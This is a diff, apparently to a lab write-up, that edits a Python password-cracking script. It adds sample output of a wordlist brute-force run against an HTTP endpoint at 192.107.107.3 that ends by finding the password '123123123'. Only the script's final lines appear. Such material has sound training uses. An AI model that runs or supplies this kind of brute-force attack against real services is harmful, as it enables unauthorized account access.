@@ -24,7 +24,7 @@ def crack(filename, ip_addr) :
       print("Unauth".lower()+"-->" + output.lower())
       continue
     else :
-      print(password)
+      print("Found : " + password)
       break
 
 if __name__ == "__main__":
@@ -34,4 +34,12 @@ if __name__ == "__main__":
 
   args = parser.parse_args()
   crack(args.filename, args.ip_addr)
+```
+Output
+```sh
+$ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3
+Trying...damian
+unauth-->unauthorized access
+Trying...123123123
+Found : 123123123
 ```
